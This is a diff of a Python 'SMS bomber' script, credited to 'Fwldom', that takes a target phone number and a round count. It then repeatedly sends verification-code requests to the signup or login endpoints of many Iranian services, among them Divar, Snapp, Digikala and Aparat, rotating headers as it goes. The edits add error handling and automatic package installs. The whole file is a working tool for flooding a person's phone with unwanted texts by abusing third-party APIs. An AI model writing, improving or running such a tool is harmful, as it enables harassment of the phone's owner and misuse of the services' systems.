@@ -1,14 +1,24 @@
-from threading import Thread
-from Api import sms, call
-from time import sleep
-from inspect import getmembers, isfunction 
-from os import system, name
-from colorama import * 
-import random
-import requests
+try: 
+     from threading import Thread
+     from Api import sms, call
+     from time import sleep
+     from inspect import getmembers, isfunction 
+     from os import system, name
+     from colorama import * 
+     import random
+     import requests
+except:
+     from os import system, name
+     print("Not install Package . Installing Package . Connect To Internet ")
+     sleep(3)
+     system("pip install api" or "pip3 install api")
+     system("pip install colorama" or "pip3 install colorama")
+     system("pip install requests" or "pip3 install requests")
+
+system("pip install user-agent" or "pip3 install user-agent")
 #Start
 system("cls" or "clear")
-print("Starting FSWMLSBomb ... ")
+print("Starting FWLDOM_BOMB ... ")
 sleep(2)
 system("cls" or "clear")
 print("Loading ..")
@@ -178,43 +188,47 @@ def bombing2():
 #sent
      k=0
      while range(yy):
-         
-         random_head = random.choice(heads)
-         requests.post(url=url_divar,json=json_divar,headers=random_head)
+         try:
+             random_head = random.choice(heads)
+             requests.post(url=url_divar,json=json_divar,headers=random_head)
 
-         requests.post(url= url_snapp,json=json_snapp,headers=random_head)
+             requests.post(url= url_snapp,json=json_snapp,headers=random_head)
 
-         requests.post(url= url_sf,json=json_sf,headers=random_head)
+             requests.post(url= url_sf,json=json_sf,headers=random_head)
 
-         requests.post(url= url_sh,json=json_sh,headers=random_head) 
+             requests.post(url= url_sh,json=json_sh,headers=random_head) 
 
-         requests.post(url= url_alibaba,json=json_alibaba,headers=random_head)
+             requests.post(url= url_alibaba,json=json_alibaba,headers=random_head)
 
-         requests.post(url= url_cinma,json=json_cinma,headers=random_head)
+             requests.post(url= url_cinma,json=json_cinma,headers=random_head)
 
-         requests.post(url= url_digikala,json=json_digikala,headers=random_head)
+             requests.post(url= url_digikala,json=json_digikala,headers=random_head)
 
-         requests.post(url= url_jet,json=json_jet,headers=random_head)
+             requests.post(url= url_jet,json=json_jet,headers=random_head)
 
-         requests.post(url= url_virgool,json=json_virgool,headers=random_head)
+             requests.post(url= url_virgool,json=json_virgool,headers=random_head)
 
-         requests.post(url= url_aparat,json=json_aparat,headers=random_head)
+             requests.post(url= url_aparat,json=json_aparat,headers=random_head)
 
-         requests.post(url= url_telewebion,json=json_telewebion,headers=random_head)
+             requests.post(url= url_telewebion,json=json_telewebion,headers=random_head)
 
-         requests.post(url= url_sb,json=json_sb,headers=random_head)
+             requests.post(url= url_sb,json=json_sb,headers=random_head)
 
-         requests.post(url= url_tpsi,json=json_tpsi,headers=random_head)
+             requests.post(url= url_tpsi,json=json_tpsi,headers=random_head)
 
-         requests.post(url=url_basalam ,json=json_basalam,headers=random_head)   
-         print(f"Round {k+1} Complte SMS XD ")
-     return True
+             requests.post(url=url_basalam ,json=json_basalam,headers=random_head)   
+         except:
+             print(f"Round {k+1} Not Send SMS ")
+             break
+         print(f"Round {k+1} Complte XD ")
+         return True
+
 
 
 if __name__ == "__main__":
     num = input( Fore.BLUE +'''***Enter your Number phone [-98:]
 [number:0999*******]---> : '''+ Fore.RESET)
-    yy = int(input("#*#Enter The Count of Round of Bombing .1 = almost 94 Sms ##>> "))
+    yy = int(input(Fore.LIGHTGREEN_EX+"#*#Enter The Count of Round of Bombing .1 = almost 94 Sms ##>> "))
     system('clear' if name == 'posix' else 'cls')
     print("*Phone Number:{}\n*Rounds: {}\n\n".format(num,yy))
     print("Starting Bombing 1 ...\n")
@@ -227,11 +241,13 @@ if __name__ == "__main__":
     system("cls" or "clear")
     print("*//>Number Phone : " + num)
     print("*//>Round : "+ str(yy))
-    while range(yy):
-         bombing2()
-         print("Complte Sms Bomb .... ")
-         print("Made By Fwldom")
-         print("GitHub : https://github.com/fwldom , Telegram : @Fwldom1 , WebSite : www.fwldom.rf.gd")
-         print("Exiting ...")
+    
+    bombing2()
+    print("Complte Sms Bomb .... ")
+    print("Made By Fwldom")
+    print("GitHub : https://github.com/fwldom , Telegram : @Fwldom1 , WebSite : www.fwldom.rf.gd")
+    print("Exiting ...")
+
+
 
 
